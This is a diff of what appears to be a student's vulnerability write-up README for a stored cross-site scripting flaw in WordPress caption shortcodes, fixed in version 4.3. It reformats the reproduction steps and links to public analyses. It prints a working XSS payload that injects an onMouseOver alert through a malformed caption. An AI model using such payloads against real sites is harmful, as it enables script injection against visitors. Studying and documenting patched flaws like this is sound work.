@@ -13,13 +13,10 @@ Time spent: **X** hours spent in total
     - Fixed in version: 4.3
   - [X] GIF Walkthrough:
     <img src='Clickme.gif' title='Clickme XSS' width='' alt='' />
-    
   - [X] Steps to recreate: 
-  
-    -add a new post
-    
-    -insert ```TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>``` on the context
-    -publish and view post
+    - add a new post
+    - insert ```TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>``` on the context
+    - publish and view post or click on preview
   - [X] Affected source code:
     - [Link 1](http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/)
     - [Link 2](http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/)
